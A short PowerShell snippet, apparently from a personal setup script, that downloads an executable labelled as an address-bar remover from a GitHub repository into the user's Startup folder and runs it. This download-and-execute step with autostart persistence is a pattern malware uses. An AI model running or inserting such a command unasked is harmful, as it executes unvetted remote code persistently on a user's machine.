Write-Host -ForegroundColor Cyan "Disable address bar"
Start-BitsTransfer -Source 'https://github.com/Tonny2442/idkuauto/raw/main/utils/AddressBarRemover2.exe' -Destination "$env:Appdata\Microsoft\Windows\Start Menu\Programs\Startup\abr.exe"
Start-Process "$env:Appdata\Microsoft\Windows\Start Menu\Programs\Startup\abr.exe"